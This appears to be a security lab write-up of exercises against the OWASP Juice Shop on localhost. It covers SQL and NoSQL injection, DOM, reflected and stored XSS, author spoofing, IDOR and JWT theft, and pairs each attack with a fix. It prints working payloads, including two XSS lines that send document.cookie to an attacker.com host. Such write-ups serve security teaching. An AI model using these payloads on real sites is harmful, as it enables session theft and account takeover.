SQLi Injection

Admin Login via SQL Injection

Authentication bypass via crafted email payload

The login endpoint passes the user-supplied email directly into a SQL query without sanitization. By injecting SQL syntax, the password check is completely bypassed — the single quote closes the email string and -- terminates the remainder of the query.

Payload 
{"email":"admin' OR TRUE --","password":"admin"}
SQL Leakage in Error Response SELECT * FROM Users WHERE email = 'admin OR '1=1 --' AND password = '...'

The server exposed the full SQL query in the error response, directly facilitating the attack.

Solution 
// Parameterized query — input is data, never syntax
db.query('SELECT * FROM Users WHERE email = ?', [email])

// Never expose SQL errors to the client
res.status(500).json({ error: 'Authentication failed' })
Key lesson: Parameterized queries treat user input as pure data. The '-- becomes a literal string to match, not a SQL terminator.
XSS

DOM-Based XSS via Search Parameter

Inject HTML via location.hash — never touches the server

Angular uses location.hash for routing. The search component renders the q parameter directly into the DOM using innerHTML. Since everything after # stays in the browser, this attack remains invisible to server-side WAFs.

Payload — Cookie Exfiltration 
http://localhost:3000/#/search?q=<img src=x onerror="new Image().src='https://attacker.com/steal?c='%2Bdocument.cookie">
Why img onerror?

Not blocked by CORS. Bypasses filters that target javascript: URIs.

Why the hash (#)?

Browsers never send fragments to the server — purely client-side execution.

Solution 
// textContent treats input as plain text, not markup
element.textContent = location.hash.slice(1)

// In Angular, use interpolation not innerHTML binding
<p>{{ searchQuery }}</p>
XSS

Reflected XSS via Order Tracking

Server echoes payload back in the HTML response

This payload makes a full HTTP round trip. The server processes the id parameter and injects it back into the page markup. In this SPA, a reload is required to force the server call.

Payload 
http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E

XSS Variant Comparison

Property DOM XSS Reflected XSS
Hits server? No Yes
Indicator # hash ? param
WAF visibility Blind Visible
Solution 
// Output-encode before inserting into HTML
const safe = req.query.id
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
XSS

Stored XSS via Product API

Payload persists in the database — every visitor becomes a victim

By intercepting product update requests, malicious payloads are stored in the database. This is a passive attack — once injected, the script executes for any user who views the product, including administrators.

Payload — API Intercept 
"description": "<img src=x onerror='new Image().src=\"https://attacker.com/steal?c=\"+document.cookie'>"
Solution 
// Sanitize on ingest — strip HTML at the API layer
const clean = DOMPurify.sanitize(req.body.description)
db.product.update({ description: clean })
Injection

NoSQL Operator Injection

MongoDB operator injection to bulk-modify reviews

The review update endpoint passes the id field directly into a MongoDB query. By providing a JSON object with a $in operator instead of a string, I could modify multiple reviews simultaneously across accounts.

Payload 
{ "id": { "$in": ["ID_1", "ID_2"] }, "message": "hacked" }
Solution 
// Reject anything that isn't a plain string
if (typeof req.body.id !== 'string') {
  return res.status(400).json({ error: 'Invalid id' })
}
Access Control

Review Author Spoofing

API trusts client-supplied identity claims

The server trusts the author field in the JSON body. An attacker can impersonate any user simply by providing their email address in the request payload — no authentication required beyond being logged in.

Payload 
{"message":"spoofed review","author":"victim@juice-sh.op"}
Solution 
// Read identity from the verified JWT server-side — never from the body
const author = req.user.email
db.reviews.insert({ message: req.body.message, author })
Access Control

Insecure Resource Ownership

No ownership check on resource deletion

While the site enforces roles (Admin vs. user), it fails to verify resource ownership. This allows any authenticated user to delete or edit data belonging to another user — a classic IDOR.

Solution — Ownership Verification 
const review = db.reviews.findOne({ _id: req.params.id })
if (review.author !== req.user.email) {
  return res.status(403).json({ error: 'Access Denied' })
}
Role-based access ≠ ownership-based access. Roles gate features; ownership gates data. Both must be enforced independently at the resource level.
Access Control Injection

JWT Exfiltration via Injection

Truncating SQL checks to harvest session tokens

By interpolating user input directly into a password reset query, the check can be bypassed using '--. This returns a valid JWT to the attacker, enabling full account takeover without knowing the target's credentials.

Solution 
// Eliminate string interpolation across ALL auth endpoints
// Use parameterized queries everywhere

db.query(
  'SELECT * FROM Users WHERE email = ? AND token = ?',
  [email, token]
)
Root Cause — Vulnerabilities 6 – 8 Trusting any client-supplied identity claim without server-side verification is the common thread. Whether it's an author field, a resource ID, or a reset token — always derive identity from the verified JWT, never from request body data.
